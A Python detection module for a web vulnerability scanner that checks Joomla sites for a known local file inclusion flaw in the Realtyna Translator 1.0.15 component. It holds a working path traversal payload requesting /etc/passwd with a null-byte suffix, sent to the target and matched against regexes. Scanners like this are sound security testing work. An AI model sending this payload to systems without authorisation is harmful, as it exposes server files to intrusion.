#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A directory traversal vulnerability in the Realtyna Translator (com_realtyna) component 1."""
...
class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Joomla! Component Realtyna Translator 1.0.15 - Local File Inclusion Detection',
        ...
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2010', 'joomla', 'lfi', 'edb', 'packetstorm', 'realtyna', 'vuln'],
        'agent': {
            'risk': 'active',
    ...
    def run(self):
        r = self.http_request(method="GET", path='/index.php?option=com_realtyna&controller=../../../../../../../../../../../../../../../etc/passwd%00', allow_redirects=False)
        ...
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="Joomla! Component Realtyna Translator 1.0.15 - Local File Inclusion detected",
                path='/index.php?option=com_realtyna&controller=../../../../../../../../../../../../../../../etc/passwd%00',
            )
            return True
        return False
